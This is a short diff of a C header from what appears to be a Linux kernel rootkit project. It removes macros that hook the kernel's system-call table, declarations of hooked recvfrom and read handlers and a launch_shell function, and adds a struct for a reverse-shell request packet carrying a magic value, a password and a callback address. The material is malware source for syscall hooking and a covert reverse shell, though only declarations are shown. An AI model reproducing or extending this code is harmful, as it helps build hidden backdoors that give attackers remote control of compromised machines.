@@ -24,35 +24,19 @@
  *
  *//* Notes
  *
- * Here the hook handlers.
  */
 
-#ifndef HOOKS_H
+#ifndef _RSHELL_H
 
-#include <linux/in.h>
+#include "arprk-conf.h"
 
-/*
- * Macros.
- */
-#define MAP_FAILED     ((void *) -1)
+// TODO: cipher that packet
+struct rshell_req {
+    char magic[sizeof(RSHELL_MAGIC)];
+    char password[sizeof(RSHELL_PASSWORD)];
+    struct sockaddr_in reverse;
+};
 
-/*
- * (Un)Hooking macros.
- */
-#define HOOK64(nr, handler) my_sct[nr] = handler
-#define HOOK32(nr, handler) my_ia32sct[nr] = handler
-#define UNHOOK64(nr) my_sct[nr] = sys_call_table[nr]
-#define UNHOOK32(nr) my_ia32sct[nr] = ia32_sys_call_table[nr]
+#define _RSHELL_H
 
-/*
- * Hook handlers.
- */
-extern int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
-extern int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
-extern int my_read64(int fd, void __user *buf, size_t len);
-extern int my_read32(int fd, void __user *buf, size_t len);
-
-extern int launch_shell(struct sockaddr_in dest);
-
-#define HOOKS_H
 #endif
